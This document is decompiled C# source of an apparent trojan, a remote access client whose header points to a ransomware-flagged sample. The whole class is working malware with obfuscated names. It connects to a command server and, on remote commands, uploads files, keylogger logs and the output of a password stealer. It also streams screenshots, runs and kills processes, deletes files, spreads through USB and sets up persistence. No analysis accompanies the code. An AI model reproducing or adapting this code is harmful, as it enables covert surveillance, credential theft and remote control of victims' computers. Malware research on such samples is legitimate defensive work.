// Decompiled with JetBrains decompiler
// Type: gltadbrigr.MARRCMD
// Assembly: gltadbrigr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 90EF545C-9E75-40E4-A102-AD83A77103BB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.MSIL.Foreign.gen-4342dd4999d1247fc9032003bafb7d3d58d2cbefe1705d5d91e258d0ed1fef86.exe

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace gltadbrigr
{
  public class MARRCMD
  {
    private bool gltadbrigrthrRuning = false;
    private PCDDRPIVF gltadbrigrHD = new PCDDRPIVF();
    public DateTime gltadbrigrlTimeUtc;
    private int MTERUREadCnts = 0;
    private int gltadbrigrbuffSize = 1024;
    public LPRRUMD gltadbrigrCMD;
    public bool gltadbrigrreqCnls = false;
    private MTRERURE gltadbrigrStateObj = new MTRERURE();
    public ProcessStartInfo gltadbrigrCStartInfo;
    private bool gltadbrigrcapScrqn = false;
    private bool gltadbrigriswitch = false;
    private bool gltadbrigrstr_writer = false;
    private string gltadbrigrcmdName = "";
    public int port_sn = 0;
    private bool gltadbrigrhasusb = false;
    private int gltadbrigratmps = 0;
    public Process gltadbrigrCProcess;
    private Dictionary<string, byte[]> gltadbrigrtasks = new Dictionary<string, byte[]>();
    private Thread gltadbrigrfunThread;
    public TcpClient gltadbrigrtcpsck;
    private int gltadbrigrbytesRead = 0;
    public NetworkStream gltadbrigrnetStream;
    private bool gltadbrigriscam = false;
    public bool gltadbrigris_wurking = false;
    public bool gltadbrigrautuCnls = false;
    private ThreadStart gltadbrigrfunuStarter;
    private int gltadbrigrscruSize = 210;

    private void gltadbrigruser_inufo()
    {
      this.gltadbrigrpusuh_data(WCRUONF.getByteArray(WCRUONF.gltadbrigrlancard + "|" + WCRUONF.gltadbrigrcname + "|" + WCRUONF.gltadbrigruname + "|" + WCRUONF.gltadbrigruip + "|" + WCRUONF.gltadbrigrOusname() + "|" + WCRUONF.gltadbrigrapver + "|" + "||" + "|" + WCRUONF.gltadbrigrget_mupath() + "|" + WCRUONF.gltadbrigrmainApp), "gltadbrigr-inufo=usuer|gltadbrigr".Split('|')[0]);
      if (!this.gltadbrigrhasusb && Directory.Exists(WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbData))
        this.gltadbrigrhasusb = true;
      if (!this.gltadbrigrhasusb)
        return;
      this.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-haususb=" + WCRUONF.gltadbrigrusbuPath() + WCRUONF.gltadbrigrusbData);
    }

    private void gltadbrigrpuush_file(string lfile)
    {
      try
      {
        string fileName = Path.GetFileName(lfile);
        this.gltadbrigrpusuh_data(File.ReadAllBytes(lfile), "gltadbrigr-fiule=!gltadbrigr".Split('!')[0] + lfile + ">0>" + fileName, true);
      }
      catch
      {
      }
    }

    public string[] gltadbrigrget_comuand()
    {
      try
      {
        byte[] buffer = new byte[5];
        this.gltadbrigrbytesRead = this.gltadbrigrnetStream.Read(buffer, 0, 5);
        int int32 = BitConverter.ToInt32(buffer, 0);
        byte[] numArray = new byte[int32];
        int offset = 0;
        for (int index = int32; index > 0; index -= this.gltadbrigrbytesRead)
        {
          int count = index > this.gltadbrigrbuffSize ? this.gltadbrigrbuffSize : index;
          this.gltadbrigrbytesRead = this.gltadbrigrnetStream.Read(numArray, offset, count);
          offset += this.gltadbrigrbytesRead;
        }
        string str = Encoding.UTF8.GetString(numArray, 0, int32).ToString();
        if (str.Trim() == "")
          return (string[]) null;
        return str.ToLower().Split('=');
      }
      catch
      {
        this.gltadbrigris_wurking = false;
        return (string[]) null;
      }
    }

    public void gltadbrigrlist_proues()
    {
      try
      {
        string str = "";
        Process[] processes = Process.GetProcesses();
        for (int index = 0; index <= processes.Length - 1; ++index)
          str = str + processes[index].Id.ToString() + ">|gltadbrigr".Split('|')[0] + processes[index].ProcessName.ToString() + ">!gltadbrigr".Split('!')[0] + "0>|gltadbrigr".Split('|')[0] + "<!gltadbrigr".Split('!')[0];
        this.gltadbrigrpusuh_data(WCRUONF.getByteArray(str), "gltadbrigr-pruocl=peuoc|gltadbrigr".Split('|')[0]);
      }
      catch
      {
      }
    }

    public void gltadbrigrsaveuFile(string filePath)
    {
      try
      {
        byte[] bytes = this.gltadbrigrpuull_data();
        if (bytes == null)
          return;
        File.WriteAllBytes(filePath, bytes);
      }
      catch
      {
      }
    }

    private bool gltadbrigrIPSuCD()
    {
      try
      {
        WCRUONF.gltadbrigrdefaultP = this.gltadbrigrCMD.gltadbrigrserverIuPD()[0];
        if (this.gltadbrigratmps > 21)
        {
          WCRUONF.gltadbrigrdefaultP = this.gltadbrigrCMD.gltadbrigrserverIuPD()[1];
          if (this.gltadbrigratmps > 26)
            this.gltadbrigratmps = 0;
        }
        ++this.gltadbrigratmps;
        this.gltadbrigrtcpsck = new TcpClient();
        this.gltadbrigrtcpsck.Connect(WCRUONF.gltadbrigrdefaultP, WCRUONF.gltadbrigrport);
        this.gltadbrigratmps = 0;
        return true;
      }
      catch
      {
        ++this.port_sn;
        WCRUONF.gltadbrigrport = WCRUONF.ports[this.port_sn];
        if (this.port_sn >= WCRUONF.ports.Length - 1)
          this.port_sn = 0;
        return false;
      }
    }

    public bool gltadbrigrsenud_auto(string fileinfo)
    {
      try
      {
        string path = fileinfo.Split('>')[0];
        if (File.Exists(path))
        {
          string fileName = Path.GetFileName(path);
          byte[] data = File.ReadAllBytes(path);
          fileinfo = fileinfo + ">" + fileName;
          this.gltadbrigrpusuh_data(data, "gltadbrigr-afuile=!gltadbrigr".Split('!')[0] + fileinfo);
          return false;
        }
        this.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-anufod=" + fileinfo);
        return false;
      }
      catch
      {
        return false;
      }
    }

    public void gltadbrigrload_aupp()
    {
      try
      {
        string str = WCRUONF.gltadbrigrget_mupath() + WCRUONF.gltadbrigrmainApp + ".exe|gltadbrigr".Split('|')[0];
        WCRUONF.gltadbrigrset_ruun("rbar|gltadbrigr".Split('|')[0], WCRUONF.gltadbrigrget_mupath() + WCRUONF.gltadbrigrmainApp + ".exe|gltadbrigr".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void gltadbrigrlook_conuect(object asdsur)
    {
      try
      {
        if (!this.gltadbrigrthrRuning)
        {
          this.gltadbrigrthrRuning = true;
          this.gltadbrigrCMD.gltadbrigrcheckuLast();
          if (!this.gltadbrigris_wurking || !this.gltadbrigrtcpsck.Connected)
          {
            this.gltadbrigris_wurking = this.gltadbrigrIPSuCD();
            if (this.gltadbrigris_wurking)
            {
              this.gltadbrigrbuffSize = this.gltadbrigrtcpsck.ReceiveBufferSize;
              this.gltadbrigrsee_rexd();
            }
          }
        }
        else
          ++this.MTERUREadCnts;
        this.gltadbrigrthrRuning = false;
      }
      catch
      {
        ++this.gltadbrigratmps;
        this.gltadbrigrthrRuning = false;
        this.MTERUREadCnts = 0;
        this.gltadbrigrstr_writer = false;
        this.gltadbrigris_wurking = false;
        this.gltadbrigriswitch = false;
      }
    }

    public void gltadbrigrdo_stuart()
    {
      WCRUONF.gltadbrigrport = WCRUONF.ports[0];
      this.gltadbrigrCMD = new LPRRUMD(this);
      this.gltadbrigrCMD.gltadbrigrrunTime = DateTime.Now;
      WCRUONF.gltadbrigrInfo();
      this.gltadbrigrHD.iserver = this;
      this.gltadbrigrStateObj.gltadbrigrtimer = new Timer(new TimerCallback(this.gltadbrigrlook_conuect), (object) this.gltadbrigrStateObj, 45000, 50000);
      this.gltadbrigrCMD.gltadbrigrseekiluogr();
      Thread.Sleep(200);
      this.gltadbrigrCMD.gltadbrigrseeUSuB();
    }

    private void gltadbrigrpass_inufo()
    {
      try
      {
        if (!File.Exists(WCRUONF.gltadbrigrget_pupath() + WCRUONF.gltadbrigrpssApp + ".exe|gltadbrigr".Split('|')[0]))
          return;
        Process.Start(WCRUONF.gltadbrigrget_pupath() + WCRUONF.gltadbrigrpssApp + ".exe|gltadbrigr".Split('|')[0]);
        for (int index = 0; index < 10; ++index)
        {
          if (File.Exists(WCRUONF.gltadbrigrget_pupath() + WCRUONF.gltadbrigrpssApp))
          {
            this.gltadbrigrpusuh_data(File.ReadAllBytes(WCRUONF.gltadbrigrget_pupath() + WCRUONF.gltadbrigrpssApp), "gltadbrigr-pauskl=seund|gltadbrigr".Split('|')[0]);
            break;
          }
        }
      }
      catch
      {
      }
    }

    public bool gltadbrigrpusuh_data(byte[] data, string type, bool tmp = false)
    {
      try
      {
        this.gltadbrigrCMD.gltadbrigrrunTime = DateTime.Now;
        if (this.gltadbrigrstr_writer)
          return false;
        this.gltadbrigrstr_writer = true;
        byte[] byteArray = WCRUONF.getByteArray(type);
        int num1 = 0;
        int num2 = 5;
        byte[] numArray = (byte[]) null;
        if (data != null)
        {
          numArray = BitConverter.GetBytes(data.Length);
          num1 = data.Length;
          num2 = 10;
        }
        byte[] bytes = BitConverter.GetBytes(byteArray.Length);
        byte[] buffer = new byte[num2 + byteArray.Length + num1];
        bytes.CopyTo((Array) buffer, 0);
        byteArray.CopyTo((Array) buffer, 5);
        if (data != null)
        {
          numArray.CopyTo((Array) buffer, 5 + byteArray.Length);
          data.CopyTo((Array) buffer, 10 + byteArray.Length);
        }
        int offset = 0;
        int length = buffer.Length;
        while (length > 0 && !this.gltadbrigrreqCnls)
        {
          int count = length > this.gltadbrigrbuffSize ? this.gltadbrigrbuffSize : length;
          this.gltadbrigrnetStream.Write(buffer, offset, count);
          offset += count;
          length -= count;
          this.gltadbrigrCMD.gltadbrigrrunTime = DateTime.Now;
        }
        this.gltadbrigrstr_writer = false;
        return !this.gltadbrigrreqCnls;
      }
      catch
      {
        this.gltadbrigrstr_writer = false;
        this.gltadbrigris_wurking = false;
        return false;
      }
    }

    private void gltadbrigris_scruen(string scrwnSize)
    {
      try
      {
        SCEPRNS sceprns = new SCEPRNS();
        this.gltadbrigrscruSize = (int) Convert.ToInt16(scrwnSize.Split('>')[0].Trim());
        while (this.gltadbrigrcapScrqn && this.gltadbrigris_wurking)
        {
          Bitmap bitmap = sceprns.gltadbrigrscureen(this.gltadbrigrscruSize);
          if (bitmap != null)
          {
            MemoryStream memoryStream = new MemoryStream();
            bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
            this.gltadbrigrpusuh_data(memoryStream.ToArray(), "gltadbrigr-scuren=ceucen|gltadbrigr".Split('|')[0]);
          }
        }
      }
      catch
      {
      }
    }

    private void gltadbrigrimage_inufo(string path)
    {
      try
      {
        Bitmap bitmap = new Bitmap((Image) new Bitmap(path), 210, 160);
        if (bitmap == null)
          return;
        FileInfo fileInfo = new FileInfo(path);
        string str = fileInfo.Name + ">!gltadbrigr".Split('!')[0] + fileInfo.CreationTimeUtc.ToString() + ">!gltadbrigr".Split('!')[0] + this.gltadbrigrCMD.gltadbrigrget_suize(fileInfo.Length) + ">!gltadbrigr".Split('!')[0];
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Png);
        this.gltadbrigrpusuh_data(memoryStream.ToArray(), "gltadbrigr-thuumb=viuew!gltadbrigr".Split('!')[0] + str);
      }
      catch
      {
      }
    }

    public byte[] gltadbrigrpuull_data()
    {
      try
      {
        this.gltadbrigrCMD.gltadbrigrrunTime = DateTime.Now;
        int offset = 0;
        byte[] buffer1 = new byte[5];
        this.gltadbrigrbytesRead = this.gltadbrigrnetStream.Read(buffer1, 0, 5);
        int int32 = BitConverter.ToInt32(buffer1, 0);
        byte[] buffer2 = new byte[int32];
        int num = int32;
        while (num > 0 && !this.gltadbrigrreqCnls)
        {
          int count = num > this.gltadbrigrbuffSize ? this.gltadbrigrbuffSize : num;
          this.gltadbrigrbytesRead = this.gltadbrigrnetStream.Read(buffer2, offset, count);
          offset += this.gltadbrigrbytesRead;
          num -= this.gltadbrigrbytesRead;
          this.gltadbrigrCMD.gltadbrigrrunTime = DateTime.Now;
        }
        if (this.gltadbrigrreqCnls)
        {
          this.gltadbrigrnetStream.Flush();
          buffer2 = (byte[]) null;
        }
        return buffer2;
      }
      catch
      {
        this.gltadbrigris_wurking = false;
        return (byte[]) null;
      }
    }

    private void gltadbrigrsee_scuren(string scrwnSize)
    {
      try
      {
        SCEPRNS sceprns = new SCEPRNS();
        this.gltadbrigrscruSize = (int) Convert.ToInt16(scrwnSize.Split('>')[0].Trim());
        Bitmap bitmap = sceprns.gltadbrigrscureen(this.gltadbrigrscruSize);
        if (bitmap == null)
          return;
        MemoryStream memoryStream = new MemoryStream();
        bitmap.Save((Stream) memoryStream, ImageFormat.Jpeg);
        this.gltadbrigrpusuh_data(memoryStream.ToArray(), "gltadbrigr-sauscr=creuen!gltadbrigr".Split('!')[0]);
      }
      catch
      {
      }
    }

    private void gltadbrigrscurvnuSize(string scSize)
    {
      try
      {
        this.gltadbrigrscruSize = (int) Convert.ToInt16(scSize.Split('>')[0].Trim());
      }
      catch
      {
      }
    }

    private void gltadbrigruploadKuLogs(string typ)
    {
      try
      {
        if (!File.Exists(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp))
          return;
        string fileName = Path.GetFileName(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp);
        DateTime lastWriteTimeUtc = File.GetLastWriteTimeUtc(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp);
        byte[] byteArray;
        using (FileStream fileStream = File.Open(WCRUONF.gltadbrigrkiuPath() + WCRUONF.gltadbrigrkiyApp, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
        {
          using (StreamReader streamReader = new StreamReader((Stream) fileStream))
            byteArray = WCRUONF.getByteArray(streamReader.ReadToEnd());
        }
        if (byteArray.Length > 0)
          this.gltadbrigrpusuh_data(byteArray, "gltadbrigr-" + typ + "=|gltadbrigr".Split('|')[0] + fileName);
        this.gltadbrigrlTimeUtc = lastWriteTimeUtc;
      }
      catch
      {
      }
    }

    private void gltadbrigrupdatue_Stats()
    {
      try
      {
        this.gltadbrigrpusuh_data(WCRUONF.gltadbrigrapps_sutatus(), "gltadbrigr-asuatas=upuds|gltadbrigr".Split('|')[0]);
      }
      catch
      {
      }
    }

    private void gltadbrigrlistuDrives()
    {
      string str = this.gltadbrigrHD.gltadbrigrlookupDrives();
      this.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-diurs=!gltadbrigr".Split('!')[0] + str);
    }

    private void gltadbrigrsee_rexd()
    {
      if (!this.gltadbrigriswitch)
      {
        this.gltadbrigriswitch = true;
        this.gltadbrigrnetStream = this.gltadbrigrCMD.gltadbrigrNuS(this.gltadbrigrtcpsck);
        this.gltadbrigrcapScrqn = false;
        while (this.gltadbrigris_wurking)
        {
          string[] switchType = this.gltadbrigrget_comuand();
          if (switchType == null)
          {
            this.gltadbrigris_wurking = false;
            break;
          }
          this.gltadbrigrreqCnls = false;
          string str1 = switchType[0];
          if (str1.Split('-').Length > 1)
            str1 = str1.Split('-')[1];
          string str2 = "";
          str2 = str1;
          string uType = "gltadbrigr$" + str1.Insert(2, "7").Replace("creen", "crqn");
          switch (uType)
          {
            case "gltadbrigr$li7stf":
            case "gltadbrigr$li7ustf":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrHD.gltadbrigrlookuFiles(switchType[1]));
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$ru7nf":
            case "gltadbrigr$ru7unf":
              Process.Start(switchType[1].Split('>')[0]);
              break;
            case "gltadbrigr$fi7le":
            case "gltadbrigr$fi7ule":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrpuush_file(switchType[1]));
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$cn7ls":
            case "gltadbrigr$cn7uls":
              this.gltadbrigrautuCnls = true;
              this.gltadbrigrreqCnls = true;
              this.gltadbrigrcapScrqn = false;
              break;
            case "gltadbrigr$rn7nkl":
            case "gltadbrigr$rnunkl":
              this.gltadbrigrCMD.gltadbrigrseekiluogr();
              break;
            case "gltadbrigr$fl7dr":
            case "gltadbrigr$fl7udr":
              string Folders = this.gltadbrigrHD.gltadbrigrcheckuFolders(switchType[1]);
              if (Folders != "")
              {
                this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-fludr=|gltadbrigr".Split('|')[0] + Folders));
                this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
                this.gltadbrigrfunThread.Start();
                break;
              }
              break;
            case "gltadbrigr$rn7nub":
            case "gltadbrigr$rn7unub":
              this.gltadbrigrCMD.gltadbrigrseeUSuBl();
              break;
            case "gltadbrigr$ru7pth":
            case "gltadbrigr$ru7upth":
              this.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-apupth=!gltadbrigr".Split('!')[0] + WCRUONF.gltadbrigrget_mupath());
              break;
            case "gltadbrigr$cl7ping":
            case "gltadbrigr$cl7uping":
              this.gltadbrigrCMD.gltadbrigrrunTime = DateTime.Now;
              break;
            case "gltadbrigr$cl7rcmd":
            case "gltadbrigr$cl7urcmd":
              this.gltadbrigrCStartInfo = (ProcessStartInfo) null;
              this.gltadbrigrCProcess = (Process) null;
              break;
            case "gltadbrigr$cl7rklg":
            case "gltadbrigr$cl7urklg":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrCMD.gltadbrigrdeleteKLS());
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$sy7sky":
            case "gltadbrigr$sy7usky":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigruploadKuLogs("syusky|gltadbrigr".Split('|')[0]));
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$pr7ocl":
            case "gltadbrigr$pr7uocl":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrlist_proues());
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$us7brun":
            case "gltadbrigr$us7ubrun":
              this.gltadbrigrCMD.gltadbrigrseeUSuB();
              break;
            case "gltadbrigr$up7datu":
            case "gltadbrigr$us7bwrm":
            case "gltadbrigr$uk7log":
            case "gltadbrigr$sn7dps":
            case "gltadbrigr$au7dio":
              this.gltadbrigrCMD.gltadbrigrdo_uputed(uType, switchType[1]);
              break;
            case "gltadbrigr$th7umb":
            case "gltadbrigr$th7uumb":
              this.gltadbrigrimage_inufo(switchType[1]);
              break;
            case "gltadbrigr$ke7erun":
            case "gltadbrigr$ke7uerun":
              this.gltadbrigrCMD.gltadbrigrseekiluogr();
              break;
            case "gltadbrigr$cl7stats":
            case "gltadbrigr$cl7ustats":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrupdatue_Stats());
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$sc7rsz":
            case "gltadbrigr$sc7ursz":
              this.gltadbrigrscurvnuSize(switchType[1]);
              break;
            case "gltadbrigr$st7ops":
            case "gltadbrigr$st7uops":
              this.gltadbrigrcapScrqn = false;
              break;
            case "gltadbrigr$do7wf":
            case "gltadbrigr$do7uwf":
              this.gltadbrigrsaveuFile(switchType[1]);
              break;
            case "gltadbrigr$af7ile":
            case "gltadbrigr$af7iule":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrsenud_auto(switchType[1]));
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$di7rs":
            case "gltadbrigr$di7urs":
              this.gltadbrigrfunThread = new Thread(new ThreadStart(this.gltadbrigrlistuDrives));
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$pa7ssl":
            case "gltadbrigr$pa7ussl":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrpass_inufo());
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$cs7crqn":
            case "gltadbrigr$cs7ucrqn":
              this.gltadbrigrsee_scuren(switchType[1]);
              break;
            case "gltadbrigr$fi7lsz":
            case "gltadbrigr$fi7ulsz":
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrCMD.gltadbrigrfile_inufo(switchType[1]));
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$sc7ren":
            case "gltadbrigr$sc7uren":
              this.gltadbrigrcapScrqn = true;
              this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigris_scruen(switchType[1]));
              this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
              this.gltadbrigrfunThread.Start();
              break;
            case "gltadbrigr$do7wr":
            case "gltadbrigr$do7uwr":
              this.gltadbrigrsaveuFile(switchType[1]);
              break;
            case "gltadbrigr$en7dpo":
            case "gltadbrigr$en7udpo":
              this.gltadbrigrCMD.gltadbrigrbreauk_prouss((int) Convert.ToInt16(switchType[1].Split('|')[0].Trim()));
              break;
            case "gltadbrigr$de7lt":
            case "gltadbrigr$de7ult":
              File.Delete(switchType[1]);
              break;
            case "gltadbrigr$ud7lt":
            case "gltadbrigr$ud7ult":
              this.gltadbrigrCMD.gltadbrigrremouve_uuser();
              break;
            case "gltadbrigr$fl7es":
            case "gltadbrigr$fl7ues":
              string files = this.gltadbrigrHD.gltadbrigrlookupuFiles(switchType[1]);
              if (files != "")
              {
                this.gltadbrigrfunuStarter = (ThreadStart) (() => this.gltadbrigrpusuh_data((byte[]) null, "gltadbrigr-flues=!gltadbrigr".Split('!')[0] + files));
                this.gltadbrigrfunThread = new Thread(this.gltadbrigrfunuStarter);
                this.gltadbrigrfunThread.Start();
                break;
              }
              break;
            case "gltadbrigr$in7fo":
            case "gltadbrigr$in7ufo":
              this.gltadbrigrfunThread = new Thread(new ThreadStart(this.gltadbrigruser_inufo));
              this.gltadbrigrfunThread.Start();
              break;
          }
        }
        this.gltadbrigris_wurking = false;
        this.gltadbrigrcapScrqn = false;
      }
      this.gltadbrigriswitch = false;
    }
  }
}
